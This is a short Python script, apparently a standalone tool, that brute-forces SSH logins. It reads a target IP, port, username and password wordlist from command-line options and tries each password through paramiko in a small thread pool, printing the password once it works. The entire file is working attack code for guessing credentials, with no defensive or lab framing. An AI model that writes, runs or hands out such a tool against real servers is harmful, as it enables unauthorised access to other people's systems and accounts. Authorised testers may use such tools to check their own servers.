import optparse
import sys
from concurrent.futures import ThreadPoolExecutor
import os
import paramiko
import queue

class SSHBruteForceAttack:
    def __init__(self) -> None:
        self.target = self.get_params()[0]
        self.port = self.get_params()[1]
        self.username = self.get_params()[2]
        self.wordlist = self.get_params()[3]
        self.q = queue.Queue()

    def get_params(self):
        parser = optparse.OptionParser('Usage: ./%s -t target IP address -p port -u username -w wordlist' % sys.argv[0])
        parser.add_option('-t', '--target', dest='target', type='string', help='Specify target IP address')
        parser.add_option('-p', '--port', dest='port', type='int', help='Specify port ')
        parser.add_option('-u', '--username', dest='username', type='string', help='Specify username')
        parser.add_option('-w', '--wordlist', dest='wordlist', type='string', help='Specify wordlist')
        options, args = parser.parse_args()
        if options.port is None:
            options.port = 22
        if options.target is None or options.username is None or options.wordlist is None:
            print(parser.usage)
            sys.exit()
        if not os.path.exists(options.wordlist):
            print("[-] The wordlist does not exist")
            sys.exit()
        return options.target, options.port, options.username, options.wordlist
    
    def ssh_login(self, password):
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh_client.connect(hostname=self.target, port=self.port, username=self.username, password=password)
            print('[-] Password found: %s' % password)
            self.q.put(password)
        except paramiko.AuthenticationException:
            print('[-] Wrong credentials: %s' % password)
        except:
            pass
        finally:
            ssh_client.close()
    

    def run(self):
        pool = ThreadPoolExecutor(max_workers=3)
        with open(self.wordlist, 'r') as f:
            while True:
                try:
                    line = f.readline()   # There will be some error when openning big wordlist, which need to be caught by "Try"
                except:
                    pass
                if len(line) == 0:
                    break
               
                if self.q.empty():
                    pool.submit(self.ssh_login,line.strip())

if __name__ == '__main__':
    cracker = SSHBruteForceAttack()
    cracker.run()